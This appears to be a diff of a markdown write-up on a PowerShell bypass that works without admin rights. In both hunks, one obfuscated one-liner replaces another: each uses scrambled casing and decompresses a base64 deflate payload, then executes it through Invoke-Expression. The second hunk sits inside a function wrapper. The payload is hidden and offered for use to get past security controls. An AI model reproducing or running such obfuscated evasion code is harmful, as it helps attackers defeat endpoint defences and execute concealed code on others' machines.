@@ -39,7 +39,7 @@ Using the code above as an example running both of these in a standard non Admin
 in your C: directory just to show you it works.
 
 ```
-(New-OBJEct SYsTEm.IO.StReamREADer( (New-OBJEct  iO.COmpREssioN.dEflAtEstrEam([SYStEm.Io.mEMoRYStREAm] [CoNVERT]::fROmBAse64STrING( 'hY6xCsIwFEV/5RG6ph0ci1MHBZEOQacsobmtQtKEvEj9fJuC4FT3e849VX89HUUMCxI/4FyNN0hiHqgaggWJNmEiYy2J86W7aRXGvJgE3TnDDNZ18JNWBdV9xKyH4L2ZraDGUrXKqRn/KTxLRs7PeWLdvdIdaaNFUYvCj8GuBxGp1LUqm5SlckAkyXTY9BYOGbuR4puyv/2t2ZAP'),[sySteM.iO.COmPREsSion.COMprEssIONmODe]::decOMpreSS ) ) , [tExt.eNcODINg]::ascIi)).rEAdToEND( )|& ( $SHELLId[1]+$ShELLid[13]+'X')
+(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
 ```
 
 I have turned this bypass into a function as well. 
@@ -57,7 +57,7 @@ param (
 [Parameter (Position=0, Mandatory = $True)]
 [string]$code )
 
-(New-OBJEct SYsTEm.IO.StReamREADer( (New-OBJEct  iO.COmpREssioN.dEflAtEstrEam([SYStEm.Io.mEMoRYStREAm] [CoNVERT]::fROmBAse64STrING( 'hY6xCsIwFEV/5RG6ph0ci1MHBZEOQacsobmtQtKEvEj9fJuC4FT3e849VX89HUUMCxI/4FyNN0hiHqgaggWJNmEiYy2J86W7aRXGvJgE3TnDDNZ18JNWBdV9xKyH4L2ZraDGUrXKqRn/KTxLRs7PeWLdvdIdaaNFUYvCj8GuBxGp1LUqm5SlckAkyXTY9BYOGbuR4puyv/2t2ZAP'),[sySteM.iO.COmPREsSion.COMprEssIONmODe]::decOMpreSS ) ) , [tExt.eNcODINg]::ascIi)).rEAdToEND( )|& ( $SHELLId[1]+$ShELLid[13]+'X')
+(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
 }
 ``` 
 
